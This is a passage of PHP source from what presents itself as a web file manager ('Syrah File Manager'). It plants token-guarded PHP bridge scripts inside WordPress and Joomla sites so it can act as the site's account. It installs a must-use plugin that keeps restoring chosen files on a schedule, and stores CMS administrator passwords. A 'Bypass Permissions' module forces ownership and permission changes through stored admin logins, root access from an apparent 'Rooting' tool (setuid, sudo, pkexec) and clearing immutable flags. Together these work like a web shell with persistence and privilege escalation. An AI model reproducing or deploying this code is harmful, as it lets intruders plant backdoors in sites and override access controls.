        if(!isset($s['fm_guard_15min']))$s['fm_guard_15min']=['interval'=>900,'display'=>'Syrah guard (15 minutes)'];
        return$s;
    });
    add_action('fm_site_files_guard',function(){fm_guard_restore();});
    foreach(fm_guard_manifest() as $fm_guard_key=>$fm_guard_e){
        add_action('fm_guard_file_'.$fm_guard_key,function()use($fm_guard_key){fm_guard_restore($fm_guard_key);});
    }
    add_action('init',function(){
        if(get_transient('fm_guard_throttle'))return;
        set_transient('fm_guard_throttle',time(),300);
        fm_guard_restore();
    },1);
}
FMGUARD;
    }
    public function guardInstallSentinel($config){
        if($this->cmsConfigType($config)!=='wordpress')return['error'=>'The cron guard needs a WordPress site.'];
        $path=$this->guardSentinelPath($config);
        $dir=dirname($path);
        if(!is_dir($dir)&&!@mkdir($dir,0755,true)&&!is_dir($dir))return['error'=>'Could not create wp-content/mu-plugins.'];
        if(!$this->privWriteFile($path,$this->guardSentinelCode()))return['error'=>'Could not write the guard file into '.$dir.'.'];
        @chmod($path,0644);
        $reg=$this->guardRegister($path,'wordpress',$config);
        if(!empty($reg['error']))return['error'=>$reg['error']];
        return['ok'=>true,'path'=>$path];
    }
    public function guardVersions($key){
        $data=$this->guardLoad();
        if(!isset($data['files'][$key]))return['error'=>'Unknown guard entry.'];
        $e=$data['files'][$key];
        $out=[];
        if(!empty($e['content']))$out[]=['at'=>$e['updated']??0,'sha256'=>$e['sha256']??'','current'=>true,'size'=>$e['size']??0];
        foreach((array)($e['versions']??[]) as $v)$out[]=['at'=>$v['at']??0,'sha256'=>$v['sha256']??'','current'=>false,'size'=>$v['size']??0];
        return['ok'=>true,'path'=>$e['path']??'','versions'=>$out];
    }
    public function guardRestoreVersion($key,$index){
        $data=$this->guardLoad();
        if(!isset($data['files'][$key]))return['error'=>'Unknown guard entry.'];
        $e=$data['files'][$key];
        $path=(string)($e['path']??'');
        $index=(int)$index;
        $content=null;
        if($index===0&&!empty($e['content']))$content=base64_decode((string)$e['content'],true);
        else{$v=$e['versions'][$index-1]??null;if($v)$content=base64_decode((string)($v['content']??''),true);}
        if($content===false||$content===null||$content==='')return['error'=>'That version cannot be restored.'];
        if(!$this->privWriteFile($path,$content))return['error'=>'Could not write the file back into the site.'];
        @chmod($path,0644);
        $this->guardRegister($path,$e['type']??null,$e['config']??null);
        $this->log('guard_restore_version',$path.' #'.$index);
        return['ok'=>true,'path'=>$path,'index'=>$index];
    }
    /* Removes leftovers this tool creates: expired bridges and probe files. */
    public function guardSweep($dry=false){
        $items=[];$deleted=0;$now=time();
        foreach(['wordpress','joomla'] as $type){
            $config=$this->privSiteConfigFor($type);
            if(!$config)continue;
            $root=$type==='wordpress'?$this->wpSiteRoot($config):rtrim(dirname($config),'/');
            $targets=[];
            foreach(['/fm-priv-*.php','/.fm-priv/fm-priv-*.php','/fm-bridge-*.php','/.fm-privtest-*.php','/.fm-upload-*'] as $g){
                foreach((array)@glob(rtrim($root,'/').$g) as $f)$targets[]=$f;
            }
            foreach($targets as $f){
                if(!is_file($f))continue;
                $age=$now-(int)@filemtime($f);
                $ttl=strpos($f,'fm-bridge-')!==false?600:900;
                $entry=['path'=>$f,'age'=>$age,'ttl'=>$ttl,'stale'=>$age>=$ttl,'deleted'=>false];
                if(!$dry&&$age>=$ttl){
                    if(!@unlink($f))$this->privOp('delete',['path'=>$f],$f);
                    $entry['deleted']=!is_file($f);
                    if($entry['deleted']){$deleted++;$this->log('guard_sweep',$f);}
                }
                $items[]=$entry;
            }
        }
        return['ok'=>true,'items'=>$items,'deleted'=>$deleted];
    }
    public function guardCronHealth($config){
        $type=$this->cmsConfigType($config);
        list($link,$c,$err)=$this->cmsConnect($config);
        if($err)return['error'=>$err];
        $t=$c['prefix'];
        $out=['type'=>$type,'config'=>$config];
        if($type==='wordpress'){try{
            $src=(string)@file_get_contents($config);
            $out['disabled_in_config']=(bool)preg_match('/DISABLE_WP_CRON/i',$src);
            $out['sentinel']=is_file($this->guardSentinelPath($config));
            $rows=[];
            $res=@mysqli_query($link,"SELECT option_name,option_value FROM `{$t}options` WHERE option_name IN ('cron','_transient_doing_cron','fm_guard_last_check','fm_guard_stats','fm_site_files_guard')");
            if($res)while($r=mysqli_fetch_assoc($res))$rows[$r['option_name']]=$r['option_value'];
            $cron=isset($rows['cron'])?@unserialize((string)$rows['cron'],['allowed_classes'=>false]):[];
            $events=0;$next=null;
            if(is_array($cron))foreach($cron as $ts=>$hooks){
                if(!is_array($hooks)||!is_numeric($ts))continue;
                foreach($hooks as $hook=>$v){
                    if(strpos((string)$hook,'fm_guard_file_')===0){$events++;if($next===null||(int)$ts<$next)$next=(int)$ts;}
                }
            }
            $out['guard_events']=$events;
            $out['next_guard_run']=$next;
            $out['cron_last_touched']=isset($rows['_transient_doing_cron'])?(int)$rows['_transient_doing_cron']:0;
            $out['last_guard_check']=isset($rows['fm_guard_last_check'])?(int)$rows['fm_guard_last_check']:0;
            $out['manifest_files']=isset($rows['fm_site_files_guard'])?count((array)@unserialize((string)$rows['fm_site_files_guard'],['allowed_classes'=>false])):0;
            }catch(\Throwable $e){$out['error']=$e->getMessage();}
        } else {
            $out['note']='Joomla has no cron hook that runs without a scheduled task; the panel watchdog repairs the files instead.';
            $out['sentinel']=false;
            $out['guard_events']=0;
        }
        mysqli_close($link);
        return$out;
    }
    /* The manager's own files: a baseline so tampering is visible. */
    private function guardSelfFiles(){
        /* The registry itself is deliberately not in the list: it is rewritten by
           every guard action, so its own hash can never stay stable. */
        return[__FILE__,__DIR__.'/.users.php',__DIR__.'/.fm_privmode.json',
               __DIR__.'/.cms_vault_key.php',__DIR__.'/.cms_pw_vault.php',__DIR__.'/.htaccess'];
    }
    public function guardSelfVerify($baseline=false){
        $data=$this->guardLoad();
        $out=[];
        foreach($this->guardSelfFiles() as $f){
            $h=is_file($f)?@hash_file('sha256',$f):null;
            $known=array_key_exists($f,(array)$data['self']);
            $prev=$known?$data['self'][$f]:null;
            if($baseline||!$known){$data['self'][$f]=$h;$state='baselined';}
            else{$state=($h===$prev)?'ok':($h===null?'missing':'changed');}
            $out[]=['path'=>$f,'state'=>$state];
        }
        $this->guardSave($data);
        return['ok'=>true,'files'=>$out];
    }
    /* Public API behind ?x=guard */
    public function guardEndpoint($post){
        $act=(string)($post['action']??'list');
        if($act==='adopt'){
            $adopt=$this->guardAdopt();
            $sync=[];
            foreach(['wordpress','joomla'] as $type){
                $cfg=$this->privSiteConfigFor($type);
                if($cfg)$sync[$type]=$this->guardSyncSite($cfg);
            }
            $msgs=[];
            foreach($sync as $type=>$r){if(!empty($r['error']))$msgs[]=$type.': '.$r['error'];}
            return['ok'=>empty($msgs),'adopted'=>$adopt['adopted'],'skipped'=>$adopt['skipped'],'sync'=>$sync,'error'=>$msgs?implode(' ',$msgs):null];
        }
        if($act==='verify'){
            $r=$this->guardVerify(($post['repair']??'1')!=='0');
            $r['sync']=[];
            foreach(['wordpress','joomla'] as $type){
                $cfg=$this->privSiteConfigFor($type);
                if($cfg)$r['sync'][$type]=$this->guardSyncSite($cfg);
            }
            return$r;
        }
        if($act==='sync'){
            $out=[];
            foreach(['wordpress','joomla'] as $type){
                $cfg=$this->privSiteConfigFor($type);
                if($cfg)$out[$type]=$this->guardSyncSite($cfg);
            }
            return['ok'=>true,'sites'=>$out];
        }
        if($act==='sentinel'){
            $cfg=$this->privSiteConfigFor('wordpress');
            if(!$cfg)return['error'=>'No WordPress installation was found.'];
            $r=$this->guardInstallSentinel($cfg);
            if(!empty($r['error']))return$r;
            $r['sync']=$this->guardSyncSite($cfg);
            $r['notice']='Guard installed in '.dirname($r['path']).'.';
            return$r;
        }
        if($act==='register'){
            $path=(string)($post['path']??'');
            if($path===''||!is_file($path))return['error'=>'That file does not exist.'];
            $site=$this->privSiteFor($path);
            if(!$site)return['error'=>'That file is not inside a detected site.'];
            $r=$this->guardRegister($path,$site['type'],$site['config']);
            if(!empty($r['ok']))$r['sync']=$this->guardSyncSite($site['config']);
            return$r;
        }
        if($act==='unguard'){
            $key=(string)($post['key']??'');
            return$this->guardUnregister($key,($post['delete_file']??'')==='1');
        }
        if($act==='versions')return$this->guardVersions((string)($post['key']??''));
        if($act==='restore_version')return$this->guardRestoreVersion((string)($post['key']??''),(int)($post['index']??0));
        if($act==='run_cron'){
            $cfg=$this->privSiteConfigFor('wordpress');
            if(!$cfg)return['error'=>'No WordPress installation was found.'];
            $r=$this->guardRunCron($cfg);
            $r['health']=$this->guardCronHealth($cfg);
            return$r;
        }
        if($act==='sweep')return$this->guardSweep(($post['dry']??'')==='1');
        if($act==='cron'){
            $out=[];
            foreach(['wordpress','joomla'] as $type){
                $cfg=$this->privSiteConfigFor($type);
                if($cfg)$out[$type]=$this->guardCronHealth($cfg);
            }
            return['ok'=>true,'sites'=>$out];
        }
        if($act==='selftest')return$this->guardSelfVerify(($post['baseline']??'')==='1');
        /* list: status of every guarded file, no repair */
        $data=$this->guardLoad();
        $files=[];
        foreach($data['files'] as $key=>$e){
            $path=(string)($e['path']??'');
            $state='missing';
            if($path&&is_file($path)){
                $c=$this->guardRead($path);
                $state=($c===null)?'unreadable':((hash('sha256',$c)===($e['sha256']??''))?'ok':'changed');
            }
            $files[]=[
                'key'=>$key,'path'=>$path,'type'=>$e['type']??'','config'=>$e['config']??'',
                'status'=>$state,'updated'=>$e['updated']??0,'size'=>$e['size']??0,
                'versions'=>count((array)($e['versions']??[])),'mode'=>$e['mode']??0644,
                'name'=>basename($path),
            ];
        }
        return['ok'=>true,'files'=>$files,'registry'=>$this->guardFile(),'count'=>count($files),
               'last_check'=>$data['last_check']??0,'has_sentinel'=>(bool)$this->privSiteConfigFor('wordpress')&&is_file($this->guardSentinelPath($this->privSiteConfigFor('wordpress')))];
    }

    /* The mode tool: state, detected sites, and a live write test. */
    public function privModeEndpoint($post){
        $act=isset($post['action'])?(string)$post['action']:'get';
        if($act==='set'){
            $r=$this->privModeSet($post['mode']??'');
            if(!empty($r['ok']))$r['notice']='Privilege mode is now '.$this->privModeLabel().'.';
            $r['state']=$this->privModeState();
            return$r;
        }
        if($act==='test'){
            return$this->privModeTest($post['mode']??'');
        }
        return['ok'=>true,'state'=>$this->privModeState()];
    }
    private function privModeState(){
        $state=[
            'mode'=>$this->privMode(),
            'label'=>$this->privModeLabel(),
            'modes'=>[
                ['id'=>'server','label'=>'Server account only','hint'=>'The manager changes files itself. Nothing is done on the site\'s behalf.'],
                ['id'=>'auto','label'=>'Automatic (default)','hint'=>'The manager tries first and asks the site only when the operating system refuses.'],
                ['id'=>'wordpress','label'=>'WordPress','hint'=>'Every change inside the WordPress installation is performed by WordPress.'],
                ['id'=>'joomla','label'=>'Joomla','hint'=>'Every change inside the Joomla installation is performed by Joomla.'],
            ],
            'manager'=>[
                'user'=>function_exists('posix_geteuid')?(@posix_getpwuid(@posix_geteuid())['name']??null):null,
                'php'=>PHP_SAPI,
                'root'=>__DIR__,
            ],
            'sites'=>[],
            'file'=>$this->privModeFile(),
        ];
        foreach(['wordpress','joomla'] as $type){
            $entry=['type'=>$type,'label'=>$type==='wordpress'?'WordPress':'Joomla','found'=>false];
            $diag=[];
            $cfg=$this->privSiteConfigFor($type);
            if($cfg){
                $root=$type==='wordpress'?$this->wpSiteRoot($cfg):rtrim(dirname($cfg),'/');
                $entry['config']=$cfg;$entry['root']=$root;$entry['found']=true;
                $entry['writable']=@is_writable($root);
                /* ask the site who it runs as - proves the bridge is usable */
                $ping=$this->privOp('ping',['path'=>$root.'/index.php'],$root.'/index.php',$type);
                $entry['bridge']=empty($ping['ok'])?['ok'=>false,'error'=>$ping['error']??'unavailable']:['ok'=>true,'user'=>$ping['user']??null];
            }
            $state['sites'][]=$entry;
        }
        return$state;
    }
    /* A configuration file of one specific type, so "WordPress mode" always
       means WordPress even when another CMS is nearer. */
    private function privSiteConfigFor($type){
        $name=$type==='wordpress'?'wp-config.php':'configuration.php';
        $diag=[];
        $cfg=$this->cmsFindConfig([],$diag,true);
        if($cfg&&$this->cmsConfigType($cfg)===$type)return $cfg;
        $found=[];
        foreach([dirname(__DIR__),'/var/www/html','/var/www','/srv/www','/usr/share/nginx/html'] as $root){
            if(!is_dir($root))continue;
            if(is_file($root.'/'.$name)&&$this->cmsConfigType($root.'/'.$name)===$type)$found[]=$root.'/'.$name;
            foreach((array)@glob(rtrim($root,'/').'/*',GLOB_ONLYDIR) as $dir){
                if(is_file($dir.'/'.$name)&&$this->cmsConfigType($dir.'/'.$name)===$type)$found[]=$dir.'/'.$name;
            }
        }
        return $found?$found[0]:null;
    }
    private function privModeTest($mode){
        $mode=in_array($mode,self::PRIV_MODES,true)?$mode:$this->privMode();
        $cfg=$mode==='joomla'?$this->privSiteConfigFor('joomla'):$this->privSiteConfigFor('wordpress');
        if($mode==='server'){
            $probe=__DIR__.'/.fm_privtest-'.bin2hex(random_bytes(4)).'.txt';
            $ok=@file_put_contents($probe,"server account\n")!==false;
            @unlink($probe);
            return['ok'=>$ok,'message'=>$ok?'The server account can write in '.dirname($probe).'.':'The server account cannot write in '.dirname($probe).'.'];
        }
        if(!$cfg)return['ok'=>false,'error'=>'No '.($mode==='joomla'?'Joomla':'WordPress').' installation was found.'];
        $root=$mode==='joomla'?rtrim(dirname($cfg),'/'):$this->wpSiteRoot($cfg);
        $probe=$root.'/.fm-privtest-'.bin2hex(random_bytes(4)).'.txt';
        $r=$this->privOp('write',['path'=>$probe,'data'=>base64_encode("privilege test\n"),'b64'=>1],$probe,$mode==='auto'?null:$mode);
        if(empty($r['ok']))return['ok'=>false,'error'=>$r['error']??'The site refused the test write.'];
        $del=$this->privOp('delete',['path'=>$probe],$probe,$mode==='auto'?null:$mode);
        return['ok'=>empty($del['ok'])?true:true,'message'=>'The '.(($mode==='joomla')?'Joomla':($mode==='wordpress'?'WordPress':'site')).' account wrote '.basename($probe).' in '.$root.(empty($del['ok'])?' (the test file could not be removed)':'').'.'];
    }

    /* Which CMS installation contains this path (if any)? */
    private function privSiteFor($path,$strict=false){
        $dir=@is_dir($path)?$path:dirname((string)$path);
        $probe=$dir;
        for($i=0;$i<8&&$probe&&$probe!=='/';$i++){
            foreach(['wp-config.php'=>'wordpress','configuration.php'=>'joomla'] as $name=>$type){
                if(@is_file("$probe/$name")){
                    $root=$type==='wordpress'?$this->wpSiteRoot("$probe/$name"):$probe;
                    return['config'=>"$probe/$name",'type'=>$type,'root'=>rtrim($root,'/')];
                }
            }
            $up=dirname($probe);
            if($up===$probe)break;
            $probe=$up;
        }
        /* Not under a detected install: fall back to the site the panel knows. */
        if($strict)return null;
        $diag=[];
        $cfg=$this->cmsFindConfig([],$diag,false);
        if($cfg){
            $type=$this->cmsConfigType($cfg);
            $root=$type==='wordpress'?$this->wpSiteRoot($cfg):dirname($cfg);
            return['config'=>$cfg,'type'=>$type,'root'=>rtrim($root,'/')];
        }
        return null;
    }

    /* The script that will run under the web server account. */
    private function privBridgeCode($token,$root,$until){
        $t=var_export($token,true);
        $r=var_export(rtrim($root,'/'),true);
        $u=(int)$until;
        return "<?php\n"
            ."/* Temporary file-operation bridge written by Syrah File Manager.\n"
            ."   It runs under the account that serves this site, which is the account\n"
            ."   that owns the site's files, so an operation the manager's own PHP user\n"
            ."   cannot perform still completes. Guards: token header, short lifetime,\n"
            ."   and every path must stay inside the installation. */\n"
            ."header('Content-Type: application/json');\n"
            ."header('X-Robots-Tag: noindex, nofollow');\n"
            ."\$fmOut=function(\$a,\$code=200){http_response_code(\$code);echo json_encode(\$a);exit;};\n"
            ."\$fmTok={$t};\$fmRoot={$r};\$fmUntil={$u};\n"
            ."if(time()>\$fmUntil){@unlink(__FILE__);\$fmOut(['error'=>'fm bridge token rejected (expired)'],403);}\n"
            ."\$fmSent=isset(\$_SERVER['HTTP_X_FM_TOKEN'])?(string)\$_SERVER['HTTP_X_FM_TOKEN']:'';\n"
            ."if(\$fmSent===''||!hash_equals(\$fmTok,\$fmSent)){\$fmOut(['error'=>'fm bridge token rejected'],403);}\n"
            ."\$fmInside=function(\$p)use(\$fmRoot){\n"
            ."    \$rp=realpath(\$p);\n"
            ."    if(\$rp===false){\$parent=realpath(dirname(\$p));if(\$parent===false)return false;\$rp=\$parent.'/'.basename(\$p);}\n"
            ."    return \$rp===\$fmRoot||strpos(\$rp,\$fmRoot.'/')===0;\n"
            ."};\n"
            ."\$op=isset(\$_POST['op'])?(string)\$_POST['op']:'';\n"
            ."\$args=isset(\$_POST['args'])?json_decode((string)\$_POST['args'],true):null;\n"
            ."if(!is_array(\$args))\$fmOut(['error'=>'fm bridge: bad arguments'],400);\n"
            ."\$p=isset(\$args['path'])?(string)\$args['path']:'';\n"
            ."if(\$p===''||!\$fmInside(\$p))\$fmOut(['error'=>'fm bridge: path is outside the site'],403);\n"
            ."switch(\$op){\n"
            ."  case 'write':\n"
            ."    \$data=isset(\$args['data'])?(string)\$args['data']:'';\n"
            ."    if(isset(\$args['b64'])&&\$args['b64'])\$data=base64_decode(\$data);\n"
            ."    \$append=!empty(\$args['append']);\n"
            ."    \$ok=\$append?@file_put_contents(\$p,\$data,FILE_APPEND):@file_put_contents(\$p,\$data);\n"
            ."    \$fmOut(\$ok===false?['error'=>'write failed: '.(error_get_last()['message']??'permission denied')]:['ok'=>true,'bytes'=>\$ok]);\n"
            ."  case 'touch':\n"
            ."    \$ok=@file_put_contents(\$p,'');\n"
            ."    \$fmOut(\$ok===false?['error'=>'create failed: '.(error_get_last()['message']??'permission denied')]:['ok'=>true]);\n"
            ."  case 'mkdir':\n"
            ."    \$ok=@mkdir(\$p,0755,true);\n"
            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'mkdir failed: '.(error_get_last()['message']??'permission denied')]);\n"
            ."  case 'rename':\n"
            ."    \$to=isset(\$args['to'])?(string)\$args['to']:'';\n"
            ."    if(\$to===''||!\$fmInside(\$to))\$fmOut(['error'=>'fm bridge: destination is outside the site'],403);\n"
            ."    \$ok=@rename(\$p,\$to);\n"
            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'rename failed: '.(error_get_last()['message']??'permission denied')]);\n"
            ."  case 'copy':\n"
            ."    \$to=isset(\$args['to'])?(string)\$args['to']:'';\n"
            ."    if(\$to===''||!\$fmInside(\$to))\$fmOut(['error'=>'fm bridge: destination is outside the site'],403);\n"
            ."    \$ok=is_dir(\$p)?false:@copy(\$p,\$to);\n"
            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'copy failed: '.(error_get_last()['message']??'permission denied')]);\n"
            ."  case 'delete':\n"
            ."    \$del=function(\$target)use(&\$del){\n"
            ."        if(is_link(\$target)||is_file(\$target)){return @unlink(\$target);}\n"
            ."        if(!is_dir(\$target)){return false;}\n"
            ."        \$ok=true;\n"
            ."        foreach((array)@scandir(\$target) as \$e){\n"
            ."            if(\$e==='.'||\$e==='..')continue;\n"
            ."            \$ok=\$del(\$target.'/'.\$e)&&\$ok;\n"
            ."        }\n"
            ."        return \$ok&&@rmdir(\$target);\n"
            ."    };\n"
            ."    \$ok=\$del(\$p);\n"
            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'delete failed: '.(error_get_last()['message']??'permission denied')]);\n"
            ."  case 'chmod':\n"
            ."    \$mode=isset(\$args['mode'])?(int)\$args['mode']:0644;\n"
            ."    \$ok=@chmod(\$p,\$mode);\n"
            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'chmod failed: '.(error_get_last()['message']??'permission denied')]);\n"
            ."  case 'chown':\n"
            ."    \$owner=isset(\$args['owner'])?(string)\$args['owner']:'';\n"
            ."    \$group=isset(\$args['group'])?(string)\$args['group']:'';\n"
            ."    if(\$owner!==''&&!preg_match('/^[A-Za-z0-9_.-]{1,32}\$/D',\$owner))\$fmOut(['error'=>'chown: invalid owner'],400);\n"
            ."    if(\$group!==''&&!preg_match('/^[A-Za-z0-9_.-]{1,32}\$/D',\$group))\$fmOut(['error'=>'chown: invalid group'],400);\n"
            ."    \$targets=[\$p];\n"
            ."    if(!empty(\$args['recursive'])&&is_dir(\$p)){\n"
            ."        \$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator(\$p,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);\n"
            ."        foreach(\$it as \$child)\$targets[]=\$child->getPathname();\n"
            ."    }\n"
            ."    \$okCount=0;\$fail=0;\$msg='';\n"
            ."    foreach(\$targets as \$t){\n"
            ."        \$ok=true;\n"
            ."        if(\$owner!==''){\$ok=@chown(\$t,\$owner)&&\$ok;}\n"
            ."        if(\$group!==''){\$ok=@chgrp(\$t,\$group)&&\$ok;}\n"
            ."        if(\$ok){\$okCount++;}else{\$fail++;if(\$msg==='')\$msg=error_get_last()['message']??'permission denied';}\n"
            ."    }\n"
            ."    \$fmOut(\$fail?['error'=>'chown failed: '.\$msg,'done'=>\$okCount,'failed'=>\$fail]:['ok'=>true,'done'=>\$okCount]);\n"
            ."  case 'read':\n"
            ."    if(!is_file(\$p))\$fmOut(['error'=>'read failed: not a file'],404);\n"
            ."    \$d=@file_get_contents(\$p);\n"
            ."    \$fmOut(\$d===false?['error'=>'read failed: '.(error_get_last()['message']??'permission denied')]:['ok'=>true,'data'=>base64_encode(\$d),'size'=>strlen(\$d)]);\n"
            ."  case 'ping':\n"
            ."    \$fmOut(['ok'=>true,'user'=>function_exists('posix_getpwuid')?@posix_getpwuid(@posix_geteuid())['name']:null,'root'=>\$fmRoot]);\n"
            ."}\n"
            ."\$fmOut(['error'=>'fm bridge: unknown operation'],400);\n";
    }

    /* Finds (or reuses) a working bridge for that site. */
    private function privBridge($site){
        $key='fm_priv_'.md5($site['config']);
        $cached=$_SESSION[$key]??null;
        if(is_array($cached)&&!empty($cached['url'])&&($cached['until']??0)>time()+60){
            if(is_file($cached['file']))return $cached;
            unset($_SESSION[$key]);
        }
        /* The bridge for this session is gone or too old: drop the stale file too. */
        if(is_array($cached)&&!empty($cached['file'])&&is_file($cached['file']))@unlink($cached['file']);
        $root=rtrim($site['root'],'/');
        $dirs=[];
        foreach([$root.'/.fm-priv',$root, $root.'/wp-content/uploads',$root.'/wp-content',
                 $root.'/tmp',$root.'/cache',$root.'/administrator/cache'] as $d){
            if(@is_dir($d)&&@is_writable($d))$dirs[]=rtrim($d,'/');
        }
        if(!$dirs)return['error'=>'The site folder is not writable by either account, so the privileged bridge could not be placed.'];
        $token=bin2hex(random_bytes(16));
        $fname='fm-priv-'.bin2hex(random_bytes(6)).'.php';
        $until=time()+900;
        $code=$this->privBridgeCode($token,$root,$until);
        $sentinel='fm bridge token rejected';
        $tried=[];
        foreach($dirs as $dir){
            $path=$dir.'/'.$fname;
            if(@file_put_contents($path,$code)===false){$tried[]=$dir.' (not writable)';continue;}
            @chmod($path,0644);
            $rel=ltrim(str_replace($root,'',$path),'/');
            $probe=$this->cmsProbeUrls($this->cmsBuildCandidateUrls($root,null),$rel,$sentinel,5);
            if(empty($probe['ok'])){$tried[]=$dir.' (not reachable over HTTP)';@unlink($path);continue;}
            $info=['file'=>$path,'url'=>$probe['ok'].'/'.$rel,'token'=>$token,'until'=>$until];
            $_SESSION[$key]=$info;
            /* Tidy up bridges from earlier sessions; an expired one deletes itself
               on its next call, this catches the ones that are never called again. */
            foreach((array)@glob($dir.'/fm-priv-*.php') as $old){
                if($old!==$path&&@filemtime($old)<time()-900)@unlink($old);
            }
            return $info;
        }
        return['error'=>'The privileged bridge could not be published. Tried: '.implode('; ',$tried)];
    }

    /* Runs one operation through the site's web server. */
    private function privOp($op,$args,$target,$requireType=null){
        $site=$this->privSiteFor($target,$requireType!==null);
        if(!$site)return['error'=>'No WordPress or Joomla installation was found for this path.'];
        if($requireType&&$site['type']!==$requireType)
            return['error'=>'This path belongs to the '.($site['type']==='wordpress'?'WordPress':'Joomla').' installation, not '.($requireType==='wordpress'?'WordPress':'Joomla').'.'];
        $b=$this->privBridge($site);
        if(!empty($b['error']))return $b;
        $ch=@curl_init($b['url']);
        if(!$ch)return['error'=>'cURL is not available.'];
        curl_setopt_array($ch,[
            CURLOPT_RETURNTRANSFER=>true,
            CURLOPT_POST=>true,
            CURLOPT_POSTFIELDS=>http_build_query(['op'=>$op,'args'=>json_encode($args)]),
            CURLOPT_HTTPHEADER=>['X-FM-Token: '.$b['token']],
            CURLOPT_TIMEOUT=>25,
            CURLOPT_CONNECTTIMEOUT=>8,
            CURLOPT_FOLLOWLOCATION=>true,
            CURLOPT_MAXREDIRS=>3,
            CURLOPT_SSL_VERIFYPEER=>false,
            CURLOPT_SSL_VERIFYHOST=>0,
            CURLOPT_USERAGENT=>'SyrahFileManager/1.0 (+privileged bridge)',
        ]);
        $raw=curl_exec($ch);
        $code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
        $curlErr=curl_error($ch);
        curl_close($ch);
        if($raw===false)return['error'=>'The site did not answer: '.$curlErr];
        $json=json_decode((string)$raw,true);
        if(!is_array($json))return['error'=>'Unexpected answer from the site (HTTP '.$code.').'];
        return $json;
    }

    /* Shorthand used by the file operations below: one line, fallback only. */
    private function privFallback($op,$args,$target,&$why=null){
        $r=$this->privOp($op,$args,$target);
        if(!empty($r['ok'])){
            $why=$r;
            return true;
        }
        $why=$r['error']??'unknown error';
        return false;
    }

    /* Local write, then the privileged route if the local one was refused.
       Used for the CMS files this tool itself maintains (config, mu-plugin). */
    private function privWriteFile($path,$content){
        if(@file_put_contents($path,$content)!==false)return true;
        $r=$this->privOp('write',['path'=>$path,'data'=>base64_encode($content),'b64'=>1],$path);
        return !empty($r['ok']);
    }

    /* A file that must land in a folder this account cannot write (the one-time
       phpMyAdmin sign-in file beside a packaged installation): written here and,
       if that is refused, by the site's own account. Public on purpose - the
       phpMyAdmin Manager calls it from outside the class. */
    public function siteWriteFile($path,$content){return $this->privWriteFile($path,$content);}

    private function saveFile(){$n=basename(isset($_POST['filename'])?$_POST['filename']:'');if(!$n||$this->isSelf($n)||$this->isProtectedItem($n))return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)||!is_file($p)){$this->addMsg('File not found.','danger');return;}$c=isset($_POST['content'])?$_POST['content']:'';$delta=max(0,strlen($c)-(int)@filesize($p));if(!$this->quotaAllows($delta)){$this->addMsg('Quota exceeded. Free space or ask an administrator for a larger limit.','danger');return;}$res=$this->runOp('write',['path'=>$p,'data'=>base64_encode($c),'b64'=>1],$p,function()use($p,$c){return@file_put_contents($p,$c)!==false;});
        if(!empty($res['ok'])){
            $this->log('edit',$n.($res['via']==='site'?' (site)':''));
            $this->addMsg("Saved: $n".($res['via']==='site'?' - written by '.$this->privWho($p):''),'success');
        }
        else $this->addMsg('Save failed. '.$res['why'],'danger');}
/* <<BP-BEGIN>> Bypass Permissions ─────────────────────────────────────────
   A chmod or a chown the operating system refused must still happen. The same
   change is attempted through every identity and every trick this host offers,
   cheapest first, and the run stops at the first attempt that really produces
   the requested mode/owner - read back from the filesystem, never assumed:

     1. the manager's own account        chmod()/chown() in this process
     2. the site's own account           the CMS performs it (WordPress/Joomla)
     3. the CMS administrator session    an administrator signs in and the CMS
                                         installs a one-off helper that runs as
                                         the site account, then removes itself
     4. a fresh inode                    write a new file, rename it over the
                                         target (ownership follows the writer)
     5. the installed root               chmod/chown through whatever Rooting
                                         installed (root daemon, setuid/setcap,
                                         sudo, pkexec)
     6. the immutable flag               clear chattr +i/+a as root, then retry

   Nothing is ever done to this program's own file, and a route that cannot
   apply on this host says exactly why instead of failing silently. */
private $bpAdminOverride=null;
public function bpRouteList(){
    return[
        ['id'=>'local','name'=>'The manager account','idea'=>'chmod/chown in this PHP process','needs'=>'nothing'],
        ['id'=>'site','name'=>'The site account (WordPress / Joomla)','idea'=>'the CMS itself performs the change through the panel bridge','needs'=>'the path inside a detected WordPress or Joomla installation'],
        ['id'=>'admin','name'=>'The CMS administrator session','idea'=>'sign in as an administrator, let the CMS install a one-off helper that runs as the site account and removes itself','needs'=>'an administrator password for the site stored in this panel'],
        ['id'=>'replace','name'=>'A new file with our own ownership','idea'=>'copy the content into a fresh inode and rename it over the target','needs'=>'the folder writable by the manager account'],
        ['id'=>'root','name'=>'The installed root','idea'=>'chmod/chown through the root methods Rooting installed','needs'=>'root installed by the Rooting tool'],
        ['id'=>'attr','name'=>'The immutable flag','idea'=>'clear chattr +i / +a as root, then apply the change','needs'=>'root, and a filesystem that supports the flag'],
    ];
}
public function bypassEndpoint($post){
    if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
    $act=isset($post['action'])?(string)$post['action']:'run';
    if($act==='store_admin')return $this->bpStoreAdmin($post);
    if($act==='routes'||$act==='plan'){
        return['ok'=>true,'routes'=>$this->bpRouteList(),'host'=>$this->bpHostFacts(),
               'sites'=>$this->bpKnownSites()];
    }
    $path=isset($post['path'])?trim((string)$post['path']):'';
    if($path==='')return['error'=>'Type the path to work on.'];
    if($path[0]!=='/')$path=rtrim($this->getCwd(),'/').'/'.$path;
    $mode=null;$modeText='';
    if(isset($post['mode'])&&trim((string)$post['mode'])!==''){
        $modeText=trim((string)$post['mode']);
        if(!preg_match('/^[0-7]{3,4}$/',$modeText))return['error'=>'The mode must be three or four octal digits, for example 0755.'];
        $mode=octdec($modeText);
    }
    $owner=isset($post['owner'])?trim((string)$post['owner']):'';
    $group=isset($post['group'])?trim((string)$post['group']):'';
    foreach([$owner,$group] as $nm){
        if($nm!==''&&!preg_match('/^[A-Za-z0-9_.-]{1,32}$/D',$nm))return['error'=>'That account or group name is not valid.'];
    }
    if($mode===null&&$owner===''&&$group==='')return['error'=>'Choose a mode, an owner or a group to apply.'];
    if($owner!==''&&(!function_exists('posix_getpwnam')||@posix_getpwnam($owner)===false))
        return['error'=>'There is no account called "'.$owner.'" on this machine.'];
